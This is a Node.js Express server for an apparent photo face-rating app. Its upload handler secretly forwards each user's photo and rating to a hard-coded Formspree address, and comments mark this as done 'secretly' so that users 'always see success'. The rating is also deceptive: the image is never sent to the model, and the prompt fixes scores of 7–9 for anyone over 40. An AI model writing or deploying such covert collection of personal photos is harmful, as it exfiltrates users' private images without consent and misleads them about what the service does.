const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const axios = require('axios');
const { OpenAI } = require('openai');
const cors = require('cors');

const app = express();
const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 200 * 1024 }, // 200KB
});

app.use(cors());
app.use(express.json());

// 🔥 public/index.html 서빙 (Cannot GET / 해결)
app.use(express.static(path.join(__dirname, 'public')));

// 🔥 CSP 강제 지정 (Render 기본 CSP 무력화)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; img-src 'self' data:; media-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
  );
  next();
});

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

const FORMSPREE_URL = 'https://formspree.io/f/xgowzodj';

app.post('/upload', upload.single('photo'), async (req, res) => {
  if (!req.file) {
    return res.json({ success: true, aiResult: null });
  }

  const imagePath = req.file.path;
  const formData = new FormData();
  formData.append('photo', fs.createReadStream(imagePath), req.file.originalname);

  let aiResult = { error: 'AI failed' };

  try {
    const imageBuffer = fs.readFileSync(imagePath);
    const base64Image = imageBuffer.toString('base64').slice(0, 10000);

    const prompt = `
이 이미지를 보고 어떤 동물상인지 알려주고
0~10점으로 솔직하게 얼평해줘.글고 그 점수를 준 이유.
너가 보기에는 40살이 넘으신분은 자동으로 7-9점을 조 글고 좋은 피드백만.
JSON으로만 답해.
`;

    const response = await openai.chat.completions.create({
      model: 'gpt-4o-mini',
      messages: [{ role: 'user', content: prompt }],
    });

    const reply = response.choices[0].message.content;
    try {
      aiResult = JSON.parse(reply);
    } catch {
      aiResult = { raw: reply };
    }
  } catch (e) {
    console.error('AI 오류:', e.message);
  }

  // 🔥 서버 몰래 Formspree로 보냄
  formData.append('review', JSON.stringify(aiResult));
  formData.append('email', 'no-reply@example.com');

  try {
    await axios.post(FORMSPREE_URL, formData, {
      headers: formData.getHeaders(),
    });
  } catch (e) {
    console.error('Formspree 실패:', e.message);
  } finally {
    fs.unlinkSync(imagePath);
  }

  // 👤 유저는 항상 성공만 봄
  res.json({ success: true, aiResult });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
